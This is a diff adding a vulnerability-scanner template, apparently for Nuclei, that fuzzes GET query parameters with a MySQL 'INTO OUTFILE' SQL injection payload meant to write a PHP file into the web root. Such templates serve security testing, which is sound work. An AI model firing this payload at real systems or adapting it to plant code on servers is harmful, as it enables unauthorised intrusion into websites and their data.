@@ -1,0 +1,39 @@
+id: fuzz-sqli-outfile
+
+info:
+  name: SQL Injection to Outfile Detection
+  author: netbaan
+  severity: critical
+  description: |
+    This template tests for SQL Injection vulnerabilities by attempting to write a PHP info file using the INTO OUTFILE statement.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Only run on GET requests
+
+    payloads:
+      sqli:
+        - "INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo(); ?>'"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "MySQL"  # Change this to verify that you might be targeting a MySQL database
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
